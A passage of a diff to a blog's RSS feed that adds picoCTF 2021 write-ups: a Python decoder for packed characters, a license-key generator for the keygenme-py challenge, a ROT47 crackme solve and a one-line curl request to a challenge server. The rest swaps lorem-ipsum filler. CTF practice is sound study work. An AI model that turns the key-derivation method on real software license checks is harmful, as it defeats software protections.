+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/python3</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpack</span>(encoded_flag):
+    flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+    <span style="color:#ff79c6">for</span> packed_char <span style="color:#ff79c6">in</span> encoded_flag:
+        start_int <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char) <span style="color:#6272a4">#get the integer value of the packed unicode character</span>
+        highChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">&gt;&gt;</span><span style="color:#bd93f9">8</span>  <span style="color:#6272a4">#bit shift the integer 8 bits to the right, which in essence divides by 256</span>
+        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(highChar)
+        lowChar <span style="color:#ff79c6">=</span> start_int <span style="color:#ff79c6">-</span> (highChar<span style="color:#ff79c6">&lt;&lt;</span><span style="color:#bd93f9">8</span>) <span style="color:#6272a4">#difference between sum of 2 packed characters, and the first character multiplied by 256 or &lt;&lt;8</span>
+        lowChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">256</span> <span style="color:#6272a4">#or you could simply use the modulus operator to get the remainder, which will be the lower char</span>
+        <span style="color:#6272a4"># explanation for retrieving lowChar.  If you multiple a number by 256</span>
+        <span style="color:#6272a4"># and then add another number that is less than 256,</span>
+        <span style="color:#6272a4"># the number added will always be the remainder when dividing the</span>
+        <span style="color:#6272a4"># sum of those two numbers by 256.</span>
+        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(lowChar)
+    <span style="color:#8be9fd;font-style:italic">print</span>(flag)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pack</span>(flag):
+    <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">len</span>(flag)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">2</span>):  <span style="color:#6272a4">#must be divisible by 2 since two chars are packed into a single char during encoding</span>
+        flag<span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34; &#34;</span>     <span style="color:#6272a4">#add blank space for padding</span>
+    encoded_flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>((<span style="color:#8be9fd;font-style:italic">ord</span>(flag[i]) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">ord</span>(flag[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>])) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(flag), <span style="color:#bd93f9">2</span>)])
+    <span style="color:#8be9fd;font-style:italic">print</span>(encoded_flag)
+    <span style="color:#ff79c6">return</span> encoded_flag
+
+<span style="color:#6272a4">#flag = &#34;This is the text that will be packed&#34;</span>
+<span style="color:#6272a4">#enc = pack(flag)</span>
+
+encoded <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;./enc&#34;</span>, mode<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;r&#39;</span>, encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
+enc <span style="color:#ff79c6">=</span> encoded<span style="color:#ff79c6">.</span>read()
+unpack(enc)
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="keygenme-py">keygenme-py</h2>
+<p>There are only two interesting part on this code. The first is the key template with the username:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">username_trial <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;FRASER&#34;</span>
+bUsername_trial <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;FRASER&#34;</span>
+
+key_part_static1_trial <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;picoCTF{1n_7h3_|&lt;3y_of_&#34;</span>
+key_part_dynamic1_trial <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;xxxxxxxx&#34;</span>
+key_part_static2_trial <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;}&#34;</span>
+key_full_template_trial <span style="color:#ff79c6">=</span> key_part_static1_trial <span style="color:#ff79c6">+</span> key_part_dynamic1_trial <span style="color:#ff79c6">+</span> key_part_static2_trial
+</code></pre></td></tr></table>
+</div>
+</div><p>The second part is the verification method to check your valid LICENSE KEY:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">check_key</span>(key, username_trial):
+
+    <span style="color:#ff79c6">global</span> key_full_template_trial
+
+    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(key) <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">len</span>(key_full_template_trial):
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#6272a4"># Check static base key part --v</span>
+        i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+        <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> key_part_static1_trial:
+            <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> c:
+                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#6272a4"># TODO : test performance on toolbox container</span>
+        <span style="color:#6272a4"># Check dynamic part --v</span>
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">4</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">5</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">3</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">6</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">2</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">7</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">1</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+        <span style="color:#ff79c6">else</span>:
+            i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+
+        <span style="color:#ff79c6">if</span> key[i] <span style="color:#ff79c6">!=</span> hashlib<span style="color:#ff79c6">.</span>sha256(username_trial)<span style="color:#ff79c6">.</span>hexdigest()[<span style="color:#bd93f9">8</span>]:
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
+
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The algorithm is the following:</p>
+<ol>
+<li>Verify the License key is the same size as the template: picoCTF{1n_7h3_|&lt;3y_of_xxxxxxxx}</li>
+<li>verify the very first charcters are the same as the static part of the template: picoCTF{1n_7h3_|&lt;3y_of_</li>
+<li>calculate the hash SHA256 of the username FRASER</li>
+<li>pick this selection of the SHA256 character to rplace the dynamic part: [4, 5, 3, 6, 2, 7, 1, 8]</li>
+</ol>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">static <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;picoCTF{1n_7h3_|&lt;3y_of_&#39;</span>
+dynamic <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([hashlib<span style="color:#ff79c6">.</span>sha256(<span style="color:#f1fa8c">&#39;FRASER&#39;</span>)<span style="color:#ff79c6">.</span>hexdigest()[i]  <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> [<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">8</span>]])
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}{}{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(static, dynamic,<span style="color:#f1fa8c">&#39;}&#39;</span>))
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="crackme-py">crackme-py</h2>
+<ul>
+<li>Rot47 algorithm with hardcoded secret.</li>
+<li>encrypt and decrypt is the same function for ROT47 and there is no key</li>
+<li>So we just need to execute <code>decode_secret(bezos_cc_secret)</code></li>
+</ul>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">import</span> importlib
+crackme <span style="color:#ff79c6">=</span> importlib<span style="color:#ff79c6">.</span>import_module(<span style="color:#f1fa8c">&#34;crackme&#34;</span>)
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;1&#39;</span>)
+bezos_cc_secret <span style="color:#ff79c6">=</span> crackme<span style="color:#ff79c6">.</span>bezos_cc_secret
+crackme<span style="color:#ff79c6">.</span>decode_secret(bezos_cc_secret)
+</code></pre></td></tr></table>
+</div>
+</div>]]></content>
+        </item>
+        
+        <item>
+            <title>picoCTF 2021 - Web Exploitation</title>
+            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-web-exploitation/</link>
+            <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-web-exploitation/</guid>
+            <description>GET aHEAD curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d&#39; &#39; -f2  </description>
+            <content type="html"><![CDATA[<h2 id="get-ahead">GET aHEAD</h2>
+<pre><code>curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d' ' -f2
+</code></pre>
+]]></content>
+        </item>
+        
+        <item>
             <title>Vim as a first choice Python IDE</title>
             <link>https://0xade1.github.io/devdraft/posts/2021/02/vim-as-a-first-choice-python-ide/</link>
             <pubDate>Thu, 11 Feb 2021 00:54:12 +0800</pubDate>
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/02/vim-as-a-first-choice-python-ide/</guid>
-            <description>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est.</description>
+            <description>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
+  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>
 
 
 
@@ -15953,14 +16903,14 @@ brew install &ndash;with-jansson &ndash;HEAD universal-ctags/universal-ctags</p>
             <pubDate>Sun, 07 Feb 2021 13:45:14 +0800</pubDate>
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/02/test/</guid>
-            <description>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</description>
+            <description>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>
 
 
 
@@ -31738,11 +32688,11 @@ p<span style="color:#ff79c6">.</span>wait()
         </item>
         
         <item>
-            <title>picoCTF 2018 - Reversing</title>
-            <link>https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-reversing/</link>
+            <title>picoCTF 2018 - Reverse Engineering</title>
+            <link>https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-reverse-engineering/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-reversing/</guid>
+            <guid>https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-reverse-engineering/</guid>
             <description>Recommended resources:  Assembler tutorial Register Calling conventions common-x86-calling-conventions X86_Disassembly/Calling_Conventions Wikipedia x86_64 calling convention  assembly-0  The program is called with two arguments: asm0(0xc9, 0xb0), so the stack frame looks like the following: calling convention is cdecl  | adress of argument2	|	ebp+12 | adress of argument1	|	ebp+8 | return address	|	ebp+4 | old ebp	| &amp;lt;--- ebp nasm code source:
 1 2 3 4 5 6 7 8 9 10 11 12 13 14  .</description>
             <content type="html"><![CDATA[<h2 id="recommended-resources">Recommended resources:</h2>
@@ -33874,7 +34824,7 @@ some more fun
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/01/test-2/</guid>
